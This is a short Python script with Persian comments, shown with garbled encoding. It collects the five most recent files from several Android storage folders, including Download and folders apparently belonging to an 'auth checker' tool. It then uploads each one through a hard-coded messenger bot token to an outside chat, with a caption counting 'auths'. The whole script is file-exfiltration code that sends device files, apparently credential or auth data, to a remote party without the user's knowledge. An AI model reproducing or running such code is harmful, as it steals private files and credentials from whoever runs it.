import os
import requests
import glob

def send_file_to_telegram(file_path, auth_count):
    token = '480342547:j3qFwxAnN66xMVpZsDzYaXxk8neECXgco8gzIKia'
    chat_id = '1884879628'
    caption = f"ğŸ“„ ÙØ§ÛŒÙ„ Ø¨Ø±Ø§ÛŒ Ù¾Ø±Ø¯Ø§Ø²Ø´ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯. ØªØ¹Ø¯Ø§Ø¯ auths: {auth_count}"

    with open(file_path, 'rb') as file:
        requests.post(
            f'https://tapi.bale.ai/bot{token}/sendDocument',
            data={'chat_id': chat_id, 'caption': caption},
            files={'document': file}
        )

def send_last_5_files(directory_paths, auth_count):
    for directory_path in directory_paths:
        # Ù¾ÛŒØ¯Ø§ Ú©Ø±Ø¯Ù† 5 ÙØ§ÛŒÙ„ Ø¢Ø®Ø± Ø§Ø² Ù‡Ø± Ù…Ø³ÛŒØ± Ø¯Ø§Ø¯Ù‡ Ø´Ø¯Ù‡
        files = glob.glob(os.path.join(directory_path, '*'))
        files = [f for f in files if os.path.isfile(f)]  # ÙÙ‚Ø· ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ Ø±Ø§ Ù†Ú¯Ù‡ Ù…ÛŒâ€ŒØ¯Ø§Ø±ÛŒÙ…
        files = sorted(files, key=os.path.getmtime, reverse=True)[:5]

        # Ø§Ø±Ø³Ø§Ù„ Ù‡Ø± ÙØ§ÛŒÙ„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        for file in files:
            send_file_to_telegram(file, auth_count)

# Ù…Ø«Ø§Ù„ Ø§Ø³ØªÙØ§Ø¯Ù‡
directories = [
    '/storage/emulated/0/AuthChecker/',  # Ù…Ø³ÛŒØ± Ø§ÙˆÙ„
    '/storage/emulated/0/Download/', '/storage/emulated/0/auth checker','/storage/emulated/0/AUTH/Ø§ÙˆØª Ú†Ú©Ø± Ù…Ø§Ù„Ú©','/storage/emulated/0/Ú†Ú©Ø± Ù…Ø§Ù„Ú©']
auth_count = 5  # ØªØ¹Ø¯Ø§Ø¯ auths Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„
send_last_5_files(directories, auth_count)
